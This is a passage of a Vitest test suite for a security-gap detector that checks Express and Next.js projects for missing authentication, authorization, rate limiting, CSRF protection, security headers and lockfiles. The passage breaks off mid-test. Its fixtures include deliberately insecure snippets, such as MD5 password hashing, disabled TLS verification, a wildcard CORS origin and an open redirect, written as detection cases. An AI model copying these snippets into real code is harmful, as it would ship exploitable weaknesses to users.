import { describe, expect, it } from "vitest";
import { runDetectors } from "@/server/detect";
import { detectGaps, isScannable } from "@/server/detect/gaps";
import type { DetectorInput, GapKind } from "@/server/detect/types";
import { isAdminPath, maskCode, maskComments } from "@/server/detect/shared";
import { assertNoSecrets } from "@/server/security/redactor";
import { EvidenceSchema, Owasp2025Schema, zId } from "@/shared/schema";
import { SAMPLE_REPO } from "./detectSamples";
import {
  GAP_MARKER,
  LOCKFILE,
  MARKED_REPO,
  expressApp,
  expressRepo,
  file,
  manifest,
} from "./gapSamples";

const gapsOf = (files: DetectorInput[]) => runDetectors(files).gaps;
const kindsOf = (files: DetectorInput[]) =>
  new Set(gapsOf(files).map((gap) => gap.kind));
const certaintyOf = (files: DetectorInput[], kind: GapKind) =>
  gapsOf(files).find((gap) => gap.kind === kind)?.certainty;

function stringLeaves(value: unknown): string[] {
  if (typeof value === "string") return [value];
  if (Array.isArray(value)) return value.flatMap(stringLeaves);
  if (value && typeof value === "object") {
    return Object.values(value).flatMap(stringLeaves);
  }
  return [];
}

// ---------------------------------------------------------------------------
// One positive and one negative per kind. The negative is the real test.
// ---------------------------------------------------------------------------

const HANDLER = "async (req, res) => { res.end(); }";
const NEXT_DEP = { "express-session": "^1.17.0" };

type Case = {
  kind: GapKind;
  absent: DetectorInput[];
  present: DetectorInput[];
};

const CASES: Case[] = [
  {
    kind: "authz_missing",
    absent: expressRepo(`app.get("/users/:id", requireAuth, ${HANDLER});`),
    present: expressRepo(
      `app.get("/users/:id", requireAuth, requireRole("admin"), ${HANDLER});`,
    ),
  },
  {
    kind: "authn_missing",
    absent: expressRepo(`app.post("/orders", ${HANDLER});`),
    present: expressRepo(`app.post("/orders", requireAuth, ${HANDLER});`),
  },
  {
    kind: "rate_limit_missing",
    absent: expressRepo(`app.post("/login", ${HANDLER});`),
    present: expressRepo(`app.post("/login", ${HANDLER});`, {
      "express-rate-limit": "^7.0.0",
    }),
  },
  {
    kind: "csrf_missing",
    absent: expressRepo(`app.post("/checkout", ${HANDLER});`, NEXT_DEP),
    present: expressRepo(
      `const csrf = require("csurf");\napp.use(csrf());\napp.post("/checkout", ${HANDLER});`,
      { ...NEXT_DEP, csurf: "^1.11.0" },
    ),
  },
  {
    kind: "security_headers_missing",
    absent: expressRepo(`app.get("/x", ${HANDLER});`),
    present: expressRepo(`app.use(helmet());`, { helmet: "^7.0.0" }),
  },
  {
    kind: "input_validation_missing",
    absent: expressRepo(
      `app.post("/x", async (req, res) => { res.json(JSON.parse(req.body)); });`,
    ),
    present: [
      manifest({ express: "^4.0.0", zod: "^3.0.0" }),
      LOCKFILE,
      expressApp(
        `const { z } = require("zod");\napp.post("/x", async (req, res) => { res.json(z.string().parse(req.body)); });`,
      ),
    ],
  },
  {
    kind: "transport_insecure",
    absent: [file("src/c.js", `fetch("http://api.acme-corp.com/v1");`)],
    present: [
      file(
        "src/c.js",
        `fetch("https://api.acme-corp.com/v1"); fetch("http://localhost:3000");`,
      ),
    ],
  },
  {
    kind: "password_storage_weak",
    absent: expressRepo(`app.post("/login", ${HANDLER});`, { pg: "^8.0.0" }),
    present: expressRepo(`app.post("/login", ${HANDLER});`, {
      pg: "^8.0.0",
      bcrypt: "^5.0.0",
    }),
  },
  {
    kind: "logging_missing",
    absent: expressRepo(`app.post("/login", ${HANDLER});`),
    present: expressRepo(`app.post("/login", ${HANDLER});`, { pino: "^9.0.0" }),
  },
  {
    kind: "error_handling_gap",
    absent: expressRepo(
      `app.get("/a", async (req, res) => { await load(); res.end(); });`,
    ),
    present: expressRepo(
      `app.get("/a", async (req, res) => { await load(); res.end(); });\napp.use((err, req, res, next) => { res.status(500).end(); });`,
    ),
  },
  {
    kind: "cors_permissive",
    absent: expressRepo(`app.use(cors());`, { cors: "^2.8.5" }),
    present: expressRepo(
      `app.use(cors({ origin: "https://app.example.com" }));`,
      { cors: "^2.8.5" },
    ),
  },
  {
    kind: "supply_chain_integrity",
    absent: [manifest({ express: "^4.0.0" })],
    present: [manifest({ express: "^4.0.0" }), LOCKFILE],
  },
];

describe.each(CASES)("detectGaps: $kind", ({ kind, absent, present }) => {
  it("reports the gap when the control is absent", () => {
    expect(kindsOf(absent)).toContain(kind);
  });

  it("stays silent when the control is present", () => {
    expect(kindsOf(present)).not.toContain(kind);
  });
});

it("covers every gap kind", () => {
  expect(new Set(CASES.map((c) => c.kind)).size).toBe(12);
});

// ---------------------------------------------------------------------------
// Certainty and expectation details
// ---------------------------------------------------------------------------

describe("detectGaps: certainty", () => {
  it("raises authz certainty on an administrative path", () => {
    const repo = expressRepo(`app.get("/admin/x", requireAuth, ${HANDLER});`);
    expect(certaintyOf(repo, "authz_missing")).toBe(0.85);
  });

  it("uses 0.7 for a record id outside an admin path", () => {
    const repo = expressRepo(`app.get("/users/:id", requireAuth, ${HANDLER});`);
    expect(certaintyOf(repo, "authz_missing")).toBe(0.7);
  });

  it("does not treat /badminton as an administrative path", () => {
    const repo = expressRepo(
      `app.get("/badminton/:id", requireAuth, ${HANDLER});`,
    );
    expect(certaintyOf(repo, "authz_missing")).toBe(0.7);
  });

  it("lowers authn certainty when middleware could not be resolved", () => {
    const repo = expressRepo(
      `const { audit } = require("./audit");\napp.post("/orders", audit, ${HANDLER});`,
    );
    expect(certaintyOf(repo, "authn_missing")).toBe(0.45);
  });

  it("flags an unauthenticated GET on an administrative path", () => {
    const repo = expressRepo(`app.get("/admin/users", ${HANDLER});`);
    expect(certaintyOf(repo, "authn_missing")).toBe(0.9);
  });

  it("lowers csrf certainty when only SameSite strict is set", () => {
    const repo = expressRepo(
      `app.use(session({ cookie: { sameSite: "strict" } }));\napp.post("/checkout", ${HANDLER});`,
      NEXT_DEP,
    );
    expect(certaintyOf(repo, "csrf_missing")).toBe(0.5);
  });

  it("raises password certainty when a fast digest sits near a password", () => {
    const repo = [
      ...expressRepo(`app.post("/login", ${HANDLER});`, { pg: "^8.0.0" }),
      file(
        "src/hash.js",
        `const crypto = require("crypto");\nconst password = req.body.p;\nconst h = crypto.createHash("md5").update(password);\n`,
      ),
    ];
    expect(certaintyOf(repo, "password_storage_weak")).toBe(0.95);
  });

  it("pins the fixed certainties of the route-independent kinds", () => {
    expect(certaintyOf(CASES[2].absent, "rate_limit_missing")).toBe(0.85);
    expect(certaintyOf(CASES[4].absent, "security_headers_missing")).toBe(0.9);
    expect(certaintyOf(CASES[5].absent, "input_validation_missing")).toBe(0.55);
    expect(certaintyOf(CASES[9].absent, "error_handling_gap")).toBe(0.5);
    // A bare cors() with no credentials exposes public data only (adversarial 11a).
    expect(certaintyOf(CASES[10].absent, "cors_permissive")).toBe(0.5);
  });

  it("reports a missing lockfile at 0.5 and a postinstall script at 0.9", () => {
    // A manifest with no dependencies has no tree to pin (adversarial 12a).
    expect(certaintyOf([manifest({ express: "^4.0.0" })], "supply_chain_integrity")).toBe(0.5);
    expect(
      certaintyOf(
        [manifest({}, { postinstall: "node x.js" }), LOCKFILE],
        "supply_chain_integrity",
      ),
    ).toBe(0.9);
  });

  it("keeps every certainty within 0..1", () => {
    for (const gap of gapsOf(MARKED_REPO)) {
      expect(gap.certainty).toBeGreaterThan(0);
      expect(gap.certainty).toBeLessThanOrEqual(1);
    }
  });
});

// ---------------------------------------------------------------------------
// False positives: the cases the regexes are most likely to get wrong
// ---------------------------------------------------------------------------

describe("detectGaps: false positives", () => {
  it.each<[string, DetectorInput[], GapKind]>([
    [
      "http:// in an XML namespace",
      [file("src/x.js", `const NS = "http://www.w3.org/2000/svg";`)],
      "transport_insecure",
    ],
    [
      "http:// to localhost",
      [file("src/x.js", `fetch("http://localhost:3000/x");`)],
      "transport_insecure",
    ],
    [
      "http:// to a compose service name",
      [file("src/x.js", `fetch("http://api:3000/x");`)],
      "transport_insecure",
    ],
    [
      "http:// to a private address",
      [file("src/x.js", `fetch("http://10.0.0.5/x");`)],
      "transport_insecure",
    ],
    [
      "http:// inside a comment",
      [file("src/x.js", `// old: http://api.acme-corp.com/v1\n`)],
      "transport_insecure",
    ],
    [
      "http:// in a markdown file",
      [file("README.md", "see http://api.acme-corp.com")],
      "transport_insecure",
    ],
    [
      "http:// in a test file",
      [file("tests/a.test.js", `fetch("http://api.acme-corp.com/v1");`)],
      "transport_insecure",
    ],
    [
      "a database port bound to loopback",
      [
        file(
          "docker-compose.yml",
          `services:\n  db:\n    image: postgres:16\n    ports:\n      - "127.0.0.1:5432:5432"\n`,
        ),
      ],
      "transport_insecure",
    ],
    [
      "cors() inside a comment",
      expressRepo(`// app.use(cors());`, { cors: "^2.8.5" }),
      "cors_permissive",
    ],
    [
      "cors declared but never called",
      expressRepo(`app.get("/x", ${HANDLER});`, { cors: "^2.8.5" }),
      "cors_permissive",
    ],
    [
      "cors() in a test file",
      [file("tests/a.test.js", `app.use(cors());`)],
      "cors_permissive",
    ],
    [
      "an Access-Control-Allow-Headers wildcard",
      [file("src/x.js", `res.set("Access-Control-Allow-Headers", "*");`)],
      "cors_permissive",
    ],
    [
      "a TypeScript-annotated error handler",
      expressRepo(
        `app.get("/a", async (req, res) => { await load(); });\napp.use((err: Error, req: Request, res: Response, next: NextFunction) => {});`,
      ),
      "error_handling_gap",
    ],
    [
      "a handler that catches",
      expressRepo(
        `app.get("/a", async (req, res) => { try { await load(); } catch (e) {} });`,
      ),
      "error_handling_gap",
    ],
    [
      "login, which must be reachable unauthenticated",
      expressRepo(`app.post("/login", ${HANDLER});`),
      "authn_missing",
    ],
    [
      "a signed webhook",
      expressRepo(`app.post("/webhooks/stripe", ${HANDLER});`),
      "authn_missing",
    ],
    [
      "a route behind app-level auth middleware",
      expressRepo(`app.use(requireAuth);\napp.post("/orders", ${HANDLER});`),
      "authn_missing",
    ],
    [
      "next-auth imported but not declared",
      [
        manifest({ express: "^4.0.0" }),
        LOCKFILE,
        expressApp(
          `const NextAuth = require("next-auth");\napp.post("/checkout", ${HANDLER});`,
        ),
      ],
      "csrf_missing",
    ],
    [
      "delegated authentication",
      expressRepo(`app.post("/login", ${HANDLER});`, {
        pg: "^8.0.0",
        "@clerk/nextjs": "^5.0.0",
      }),
      "password_storage_weak",
    ],
    [
      "an installed rate limiter the curated list does not track",
      expressRepo(`app.post("/login", ${HANDLER});`, {
        "rate-limiter-flexible": "^5.0.0",
      }),
      "rate_limit_missing",
    ],
    [
      "an installed logger the curated list does not track",
      expressRepo(`app.post("/login", ${HANDLER});`, { winston: "^3.0.0" }),
      "logging_missing",
    ],
    [
      "console output inside the auth handler",
      expressRepo(
        `app.post("/login", async (req, res) => { console.log("attempt"); });`,
      ),
      "logging_missing",
    ],
    [
      "a lockfile with a different package manager",
      [manifest(), file("pnpm-lock.yaml", "lockfileVersion: 9")],
      "supply_chain_integrity",
    ],
    [
      "a commented-out route",
      expressRepo(`// app.post("/orders", createOrder);`),
      "authn_missing",
    ],
    [
      "a guard after a comment inside the route call",
      expressRepo(
        `app.post(\n  "/orders",\n  // must be logged in\n  protect,\n  ${HANDLER},\n);`,
      ),
      "authn_missing",
    ],
    [
      "an error handler registered below a regex containing an escaped slash-star",
      // /\/*$/ used to open a block comment that blanked the error handler below it.
      expressRepo(
        `app.get("/a", async (req, res) => { await load(); });\nconst trim = (p) => p.replace(/\\/*$/, "");\napp.use((err, req, res, next) => { res.status(500).end(); });`,
      ),
      "error_handling_gap",
    ],
    [
      "headers set in vercel.json",
      [
        ...expressRepo(`app.get("/x", ${HANDLER});`),
        file(
          "vercel.json",
          JSON.stringify({
            headers: [
              {
                source: "/(.*)",
                headers: [
                  {
                    key: "Strict-Transport-Security",
                    value: "max-age=63072000",
                  },
                ],
              },
            ],
          }),
        ),
      ],
      "security_headers_missing",
    ],
    [
      "a Netlify _headers file, which opens with /*",
      [
        ...expressRepo(`app.get("/x", ${HANDLER});`),
        file("_headers", "/*\n  Referrer-Policy: no-referrer\n"),
      ],
      "security_headers_missing",
    ],
    [
      "Express 5, which forwards a rejected handler to the error handler",
      expressRepo(
        `app.get("/a", async (req, res) => { await load(); res.end(); });`,
        { express: "^5.1.0" },
      ),
      "error_handling_gap",
    ],
    [
      "Express 4 patched by express-async-errors",
      expressRepo(
        `app.get("/a", async (req, res) => { await load(); res.end(); });`,
        { "express-async-errors": "^3.1.1" },
      ),
      "error_handling_gap",
    ],
    [
      "zod imported through a subpath",
      expressRepo(
        `const { z } = require("zod/v4");\napp.post("/x", async (req, res) => { res.json(z.string().parse(req.body)); });`,
      ),
      "input_validation_missing",
    ],
    [
      "a scoped validation library imported through a subpath",
      expressRepo(
        `const { Value } = require("@sinclair/typebox/value");\napp.post("/x", async (req, res) => { res.json(Value.Check(S, req.body)); });`,
      ),
      "input_validation_missing",
    ],
  ])("does not fire on %s", (_label, files, kind) => {
    expect(kindsOf(files)).not.toContain(kind);
  });

  it("does not let a router merely named auth suppress authn_missing", () => {
    const repo = expressRepo(
      `app.use("/x", authRouter);\napp.post("/orders", ${HANDLER});`,
    );
    expect(kindsOf(repo)).toContain("authn_missing");
  });

  it("does not let an app-level rate limiter named auth suppress authn_missing", () => {
    const repo = expressRepo(
      `const authLimiter = rateLimit({ max: 5 });\napp.use(authLimiter);\napp.post("/orders", ${HANDLER});`,
    );
    expect(kindsOf(repo)).toContain("authn_missing");
  });

  it("applies a path-scoped guard only under its own prefix", () => {
    // app.use("/admin", requireAuth) used to silence authn_missing for every route.
    const repo = expressRepo(
      [
        `app.use("/admin/", requireAuth);`,
        `app.post("/admin", ${HANDLER});`,
        `app.post("/admin/users", ${HANDLER});`,
        `app.post("/administrators", ${HANDLER});`,
        `app.post("/orders", ${HANDLER});`,
      ].join("\n"),
    );
    const flagged = runDetectors(repo)
      .evidence.filter((e) => e.ruleId === "gap:authn_missing")
      .map((e) => e.summary.split(" ").slice(0, 2).join(" "));

    expect(flagged).toEqual(["POST /administrators", "POST /orders"]);
  });

  it.each([
    [`app.use("/", requireAuth);`],
    [`app.use("/*", requireAuth);`],
    [`app.use("*", requireAuth);`],
  ])("treats %s as a global guard", (use) => {
    expect(
      kindsOf(expressRepo(`${use}\napp.post("/orders", ${HANDLER});`)),
    ).not.toContain("authn_missing");
  });

  it("still reports header gaps when vercel.json sets no headers", () => {
    const repo = [
      ...expressRepo(`app.get("/x", ${HANDLER});`),
      file("vercel.json", JSON.stringify({ rewrites: [] })),
    ];
    expect(kindsOf(repo)).toContain("security_headers_missing");
  });

  it("keeps the error handling check while any express is below 5", () => {
    const route = `app.get("/a", async (req, res) => { await load(); res.end(); });`;
    expect(
      kindsOf(expressRepo(route, { express: "^4.0.0 || ^5.0.0" })),
    ).toContain("error_handling_gap");
    expect(
      kindsOf([
        ...expressRepo(route, { express: "^5.1.0" }),
        file(
          "services/legacy/package.json",
          JSON.stringify({ dependencies: { express: "^4.18.2" } }),
        ),
      ]),
    ).toContain("error_handling_gap");
  });

  it("still fires input validation when JSON.parse is the only handling", () => {
    // JSON.parse is the opposite of validation: it must not count as a control.
    expect(kindsOf(CASES[5].absent)).toContain("input_validation_missing");
  });

  it("flags a bare cors call and a wildcard origin", () => {
    const bare = expressRepo(`app.use(cors());`, { cors: "^2.8.5" });
    const wildcard = expressRepo(`app.use(cors({ origin: "*" }));`, {
      cors: "^2.8.5",
    });
    expect(kindsOf(bare)).toContain("cors_permissive");
    expect(kindsOf(wildcard)).toContain("cors_permissive");
  });

  it("flags disabled TLS verification and an exposed database port", () => {
    expect(
      kindsOf([file("src/x.js", `const a = { rejectUnauthorized: false };`)]),
    ).toContain("transport_insecure");
    expect(kindsOf(MARKED_REPO)).toContain("transport_insecure");
  });

  it("does not report a gap for an empty repository", () => {
    expect(detectGaps([], runDetectors([]))).toEqual({
      gaps: [],
      evidence: [],
    });
  });

  it("survives files that are nothing but noise", () => {
    expect(() =>
      runDetectors([
        file("a.ts", "\0\0\0"),
        file("b.js", '"unterminated'),
        file("c.js", "/* never closed"),
        file("d.js", "`open template"),
        file("package.json", "{{{"),
        file("docker-compose.yml", ":::"),
      ]),
    ).not.toThrow();
  });
});

// ---------------------------------------------------------------------------
// Shape: gaps and their evidence
// ---------------------------------------------------------------------------

describe("detectGaps: shape", () => {
  const { gaps, evidence } = runDetectors(MARKED_REPO);
  const gapEvidence = evidence.filter((e) => e.id.startsWith("ev-gap-"));

  it("produces gaps to test against", () => {
    expect(gaps.length).toBeGreaterThan(5);
  });

  it("gives every gap a contiguous kebab-case id", () => {
    expect(gaps.map((gap) => gap.id)).toEqual(
      gaps.map((_, index) => `gap-${index + 1}`),
    );
    for (const gap of gaps) expect(zId.safeParse(gap.id).success).toBe(true);
  });

  it("emits exactly one evidence item per gap, numbered the same", () => {
    expect(gapEvidence).toHaveLength(gaps.length);
    for (const [index, gap] of gaps.entries()) {
      expect(gapEvidence[index].id).toBe(`ev-gap-${index + 1}`);
      expect(gapEvidence[index].filePath).toBe(gap.file);
      expect(gapEvidence[index].lineStart).toBe(gap.line);
    }
  });

  it("tags evidence with gap:<kind> and the OWASP 2025 categories", () => {
    for (const [index, gap] of gaps.entries()) {
      const item = gapEvidence[index];
      expect(item.ruleId).toBe(`gap:${gap.kind}`);
      expect(item.metadata?.owasp2025).toEqual(gap.owasp);
      for (const code of gap.owasp) {
        expect(Owasp2025Schema.safeParse(code).success).toBe(true);
      }
    }
  });

  it("is schema-valid, detector-sourced, and never carries a snippet", () => {
    for (const item of gapEvidence) {
      expect(EvidenceSchema.safeParse(item).success).toBe(true);
      expect(item.source).toBe("detector");
      expect(["code", "config"]).toContain(item.kind);
      expect(item.snippet).toBeUndefined();
      expect(item.filePath).toBeTruthy();
      expect(item.lineStart).toBeGreaterThanOrEqual(1);
    }
  });

  it("gives every gap a mapping and at least one basis fact", () => {
    for (const gap of gaps) {
      expect(gap.owasp.length).toBeGreaterThan(0);
      expect(gap.stride.length).toBeGreaterThan(0);
      expect(gap.cwe.every((c) => /^CWE-\d+$/.test(c))).toBe(true);
      expect(gap.basisFacts.length).toBeGreaterThan(0);
      expect(gap.line).toBeGreaterThanOrEqual(1);
    }
  });

  it("leaves the other evidence categories without a ruleId", () => {
    for (const item of evidence.filter((e) => !e.id.startsWith("ev-gap-"))) {
      expect(item.ruleId).toBeUndefined();
    }
  });
});

// ---------------------------------------------------------------------------
// Untrusted content (CLAUDE.md rule 3)
// ---------------------------------------------------------------------------

describe("detectGaps: no repository content reaches a gap", () => {
  const result = runDetectors(MARKED_REPO);
  const leaves = stringLeaves([result.gaps, result.evidence]);

  it("has the marker in every source the gaps are built from", () => {
    // Guards the guard: a marker that is not in the samples proves nothing.
    const samples = stringLeaves(MARKED_REPO).join("\n");
    expect(samples).toContain(GAP_MARKER);
    expect(result.gaps.length).toBeGreaterThan(0);
  });

  it("copies no marker into a gap or its evidence", () => {
    expect(leaves.join("\n")).not.toContain(GAP_MARKER);
  });

  it("produces text that passes the secret sweep", () => {
    expect(() => assertNoSecrets(leaves.join("\n"))).not.toThrow();
  });

  it("would notice if a gap did start copying content", () => {
    const samples = stringLeaves(MARKED_REPO).join("\n");
    expect(() => assertNoSecrets(samples)).toThrow();
  });
});

// ---------------------------------------------------------------------------
// Stability
// ---------------------------------------------------------------------------

describe("detectGaps: stability", () => {
  const baseline = runDetectors(MARKED_REPO);

  it("is identical however the input is ordered", () => {
    expect(runDetectors([...MARKED_REPO].reverse())).toEqual(baseline);
    expect(
      runDetectors(
        [...MARKED_REPO].sort((a, b) => b.path.length - a.path.length),
      ),
    ).toEqual(baseline);
  });

  it("is deterministic across repeated runs", () => {
    expect(runDetectors(MARKED_REPO)).toEqual(baseline);
  });
});

// ---------------------------------------------------------------------------
// The shared sample repository: a regression net
// ---------------------------------------------------------------------------

describe("detectGaps: the sample repository", () => {
  const kinds = kindsOf(SAMPLE_REPO);

  it("reports the kinds its routes and config actually earn", () => {
    expect([...kinds].sort()).toEqual(
      [
        "authn_missing",
        "authz_missing",
        "error_handling_gap",
        "input_validation_missing",
        "logging_missing",
        "rate_limit_missing",
        "supply_chain_integrity",
        "transport_insecure",
      ].sort(),
    );
  });

  it.each<[string, GapKind]>([
    ["helmet is declared and called", "security_headers_missing"],
    ["cors is declared but never called", "cors_permissive"],
    ["no session dependency is declared", "csrf_missing"],
    ["passwords are delegated to Clerk", "password_storage_weak"],
  ])("stays silent because %s", (_why, kind) => {
    expect(kinds).not.toContain(kind);
  });

  it("does not report the login route as unauthenticated", () => {
    const authn = gapsOf(SAMPLE_REPO).filter((g) => g.kind === "authn_missing");
    expect(authn.every((g) => !g.basisFacts.join().includes("login"))).toBe(
      true,
    );
    expect(
      runDetectors(SAMPLE_REPO).evidence.some(
        (e) => e.ruleId === "gap:authn_missing" && /\/login\b/.test(e.summary),
      ),
    ).toBe(false);
  });

  it("puts the admin role check on GET /admin/users out of authz scope", () => {
    const authz = runDetectors(SAMPLE_REPO).evidence.filter(
      (e) => e.ruleId === "gap:authz_missing",
    );
    expect(authz.some((e) => e.summary.includes("/admin/users"))).toBe(false);
  });
});

// ---------------------------------------------------------------------------
// Helpers this module adds
// ---------------------------------------------------------------------------

describe("isAdminPath", () => {
  it.each([
    ["/admin", true],
    ["/api/admin/users", true],
    ["/admin-panel/x", true],
    ["/administrator", true],
    ["/badminton", false],
    ["/api/administrative-notes", false],
    ["/sysadminish", false],
    ["/users/:id", false],
  ])("classifies %s as %s", (path, expected) => {
    expect(isAdminPath(path)).toBe(expected);
  });
});

describe("maskCode and maskComments", () => {
  const source = `a();\n// b()\n/* c() */ d("e()");\n`;

  it("blanks comments and keeps strings in maskComments", () => {
    const masked = maskComments(source);
    expect(masked).not.toContain("b()");
    expect(masked).not.toContain("c()");
    expect(masked).toContain('"e()"');
  });

  it("blanks comments and string bodies in maskCode", () => {
    const masked = maskCode(source);
    expect(masked).toContain("a()");
    expect(masked).toContain("d(");
    expect(masked).not.toContain("e()");
  });

  it("preserves length and every newline, so line numbers hold", () => {
    for (const masked of [maskCode(source), maskComments(source)]) {
      expect(masked).toHaveLength(source.length);
      expect(masked.split("\n")).toHaveLength(source.split("\n").length);
    }
  });

  it("does not treat // inside a string as a comment", () => {
    expect(maskComments(`const u = "http://a.b"; x();`)).toContain("x();");
  });

  it.each([
    ["an escaped slash before a star", `p.replace(/\\/*$/, "");\nguard();\n`],
    ["escaped slashes in a URL regex", `/^https?:\\/\\//.test(s); guard();\n`],
  ])("does not open a comment at %s inside a regex", (_label, source) => {
    for (const masked of [maskCode(source), maskComments(source)]) {
      expect(masked).toContain("guard();");
    }
  });

  it("still blanks a real comment that follows a regex", () => {
    const masked = maskComments(
      `/\\/*$/.test(p); // gone()\n/* gone() */ kept();`,
    );
    expect(masked).not.toContain("gone()");
    expect(masked).toContain("kept();");
  });

  it.each(["/* never closed", '"open quote', "`open template", "\0\0", ""])(
    "terminates on unterminated input %j",
    (input) => {
      expect(() => maskCode(input)).not.toThrow();
      expect(maskCode(input)).toHaveLength(input.length);
    },
  );
});

describe("isScannable", () => {
  it.each([
    ["src/app.ts", true],
    ["app/api/x/route.js", true],
    ["tests/a.test.ts", false],
    ["src/a.spec.ts", false],
    ["__mocks__/db.js", false],
    ["examples/demo.js", false],
    ["node_modules/x/index.js", false],
    ["README.md", false],
  ])("treats %s as scannable=%s", (path, expected) => {
    expect(isScannable(path)).toBe(expected);
  });
});

describe("detectGaps: NodeGoat-style routes", () => {
  const files: DetectorInput[] = [
    {
      path: "app/routes/index.js",
      content: [
        'const express = require("express");',
        'const SessionHandler = require("./session");',
        "const index = (app, db) => {",
        "    const sessionHandler = new SessionHandler(db);",
        "    const isLoggedIn = sessionHandler.isLoggedInMiddleware;",
        '    app.post("/profile", isLoggedIn, sessionHandler.a);',
        '    app.post("/contributions", isLoggedIn, sessionHandler.b);',
        '    app.post("/benefits", isLoggedIn, sessionHandler.c);',
        '    app.post("/memos", isLoggedIn, sessionHandler.d);',
        '    app.post("/unguarded", sessionHandler.e);',
        '    app.get("/learn", isLoggedIn, (req, res) => res.redirect(req.query.url));',
        "};",
        "module.exports = index;",
      ].join("\n"),
    },
  ];
  const gaps = gapsOf(files);

  it("reports no authn_missing for routes behind isLoggedIn, only for the unguarded one", () => {
    const authn = gaps.filter((g) => g.kind === "authn_missing");
    expect(authn.map((g) => g.summary)).toEqual([
      "POST /unguarded changes state with no authentication middleware or session check",
    ]);
  });

  it("carries a route-naming summary on each gap for the threat prompt", () => {
    const input = gaps.find((g) => g.kind === "input_validation_missing");
    expect(input?.scope).toBe("route");
    expect(input?.summary).toMatch(/^GET \/learn reads request input/);
  });
});

// ---------------------------------------------------------------------------
// Adversarial review (docs/gap-adversarial-review.md): controls that ARE present
// ---------------------------------------------------------------------------

describe("adversarial: authz_missing", () => {
  it("1a: an ownership comparison in the handler is an authorization check", () => {
    const repo = expressRepo(
      `app.get("/posts/:id", requireAuth, async (req, res) => {\n  const post = await db.find(req.params.id);\n  if (post.ownerId !== req.user.id) return res.status(403).end();\n  res.json(post);\n});`,
    );
    expect(kindsOf(repo)).not.toContain("authz_missing");
  });

  it("1a: an owner-scoped query counts too", () => {
    const repo = expressRepo(
      `app.delete("/posts/:id", requireAuth, async (req, res) => {\n  await db.post.delete({ where: { id: req.params.id, userId: req.user.id } });\n  res.end();\n});`,
    );
    expect(kindsOf(repo)).not.toContain("authz_missing");
  });

  it("1b: a role guard mounted with app.use covers the routes under its prefix", () => {
    const repo = expressRepo(
      `app.use("/admin", requireAdmin);\napp.get("/admin/users", requireAuth, ${HANDLER});\napp.get("/users/:id", requireAuth, ${HANDLER});`,
    );
    const gaps = gapsOf(repo).filter((gap) => gap.kind === "authz_missing");
    expect(gaps.map((gap) => gap.routePath)).toEqual(["/users/:id"]);
  });

  it("1c: a Next App Router export wrapped in withRole is authenticated and authorized", () => {
    const repo = [
      manifest({ next: "^15.0.0" }),
      LOCKFILE,
      file(
        "app/api/admin/users/route.ts",
        `import { withRole } from "@/lib/auth";\nexport const GET = withRole("admin", async () => Response.json([]));\n`,
      ),
    ];
    expect(kindsOf(repo)).not.toContain("authz_missing");
    expect(kindsOf(repo)).not.toContain("authn_missing");
  });

  it("still reports a parameterised route with nothing but a login check", () => {
    expect(kindsOf(CASES[0].absent)).toContain("authz_missing");
  });
});

describe("adversarial: authn_missing", () => {
  it("2a: a Next 16 proxy.ts that calls auth() guards every route handler", () => {
    const repo = [
      manifest({ next: "^16.0.0" }),
      LOCKFILE,
      file(
        "proxy.ts",
        `import { auth } from "@/auth";\nexport default auth((req) => { if (!req.auth) return Response.redirect("/login"); });\nexport const config = { matcher: ["/api/:path*"] };\n`,
      ),
      file("app/api/orders/route.ts", `export async function POST() { return Response.json({}); }\n`),
    ];
    expect(kindsOf(repo)).not.toContain("authn_missing");
  });

  it.each([
    ["express-jwt", `const { expressjwt } = require("express-jwt");\napp.use(expressjwt({ secret, algorithms: ["HS256"] }));`],
    ["Auth0 checkJwt", `const checkJwt = require("./jwt");\napp.use(checkJwt);`],
    ["Clerk", `const { clerkMiddleware } = require("@clerk/express");\napp.use(clerkMiddleware());`],
    ["verifySession", `const verifySession = require("./session");\nrouter.use(verifySession);`],
  ])("2b: %s applied with .use() is a guard", (_name, setup) => {
    const repo = expressRepo(`${setup}\napp.post("/orders", ${HANDLER});`);
    expect(kindsOf(repo)).not.toContain("authn_missing");
  });

  it("2c: an inline require of an auth module in .use() is a guard", () => {
    const repo = expressRepo(
      `app.use(require("./middleware/requireAuth"));\napp.post("/orders", ${HANDLER});`,
    );
    expect(kindsOf(repo)).not.toContain("authn_missing");
  });

  it("does not take a rate limiter or a router mount for a guard", () => {
    const repo = expressRepo(
      `app.use(jwtLimiter);\napp.use("/auth", authRouter);\napp.post("/orders", ${HANDLER});`,
    );
    expect(kindsOf(repo)).toContain("authn_missing");
  });
});

describe("adversarial: rate_limit_missing", () => {
  const login = `app.post("/login", ${HANDLER});`;

  it.each([
    ["nginx limit_req", "nginx.conf", `limit_req_zone $binary_remote_addr zone=login:10m rate=5r/m;\nserver { location /login { limit_req zone=login; } }\n`],
    ["Caddy rate_limit", "Caddyfile", `example.com {\n  rate_limit { zone login { key {remote_host} events 5 window 1m } }\n}\n`],
    ["HAProxy stick-table", "haproxy.cfg", `frontend web\n  stick-table type ip size 100k expire 30s store http_req_rate(10s)\n`],
  ])("3a: %s in proxy config is rate limiting", (_name, path, content) => {
    const repo = [...expressRepo(login), file(path, content)];
    expect(kindsOf(repo)).not.toContain("rate_limit_missing");
  });

  it("3b: express-brute is a rate limiter", () => {
    const repo = expressRepo(
      `const ExpressBrute = require("express-brute");\nconst brute = new ExpressBrute(store);\napp.post("/login", brute.prevent, ${HANDLER});`,
      { "express-brute": "^1.0.1" },
    );
    expect(kindsOf(repo)).not.toContain("rate_limit_missing");
  });

  it("3c: a hand-rolled brute-force guard counts by name", () => {
    const repo = expressRepo(
      `const bruteForce = require("./bruteForce");\napp.post("/login", bruteForce, ${HANDLER});`,
    );
    expect(kindsOf(repo)).not.toContain("rate_limit_missing");
  });

  it("3d: a login delegated to a hosted identity provider has no local brute-force target", () => {
    const repo = expressRepo(
      `app.get("/login", (req, res) => res.oidc.login());`,
      { "express-openid-connect": "^2.17.0" },
    );
    expect(kindsOf(repo)).not.toContain("rate_limit_missing");
  });

  it("still reports a bare login route", () => {
    expect(kindsOf(expressRepo(login))).toContain("rate_limit_missing");
  });
});

describe("adversarial: csrf_missing", () => {
  const checkout = `app.post("/checkout", ${HANDLER});`;

  it("4a: a JSON-only body parser lowers certainty to 0.45 and says why", () => {
    const repo = expressRepo(`app.use(express.json());\n${checkout}`, NEXT_DEP);
    const gap = gapsOf(repo).find((g) => g.kind === "csrf_missing");
    expect(gap?.certainty).toBe(0.45);
    expect(gap?.basisFacts).toContain("JSON-only body parser");
  });

  it("4a: a form body parser beside the JSON one keeps 0.8", () => {
    const repo = expressRepo(
